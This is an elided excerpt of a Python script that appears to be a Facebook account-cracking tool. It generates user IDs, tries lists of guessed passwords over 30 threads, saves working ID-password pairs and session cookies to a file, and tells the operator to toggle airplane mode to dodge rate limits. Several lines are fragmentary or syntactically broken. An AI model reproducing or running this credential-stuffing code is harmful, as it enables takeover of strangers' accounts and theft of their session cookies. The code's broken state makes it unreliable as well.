...
def rehan():
	...
	if gh =='1':
		...
		os.system('xdg-open https://www.facebook.com/profile.php?id=100001687800616')
	elif gh =='0':
...
def ali_khan():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')saved in ok.txt,cp.txt')
...
def malik_baloch():
	...
	for nmbr in 
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'malik123','malik1122','baloch786','malikji','malik12345','bloach12345','bloachbloach']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[ALIVE] '+uid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('LPC-OK.txt', 'a').write(uid+' | '+ps+ '\n')
                oks.append(uid)
                break
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mRunning\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
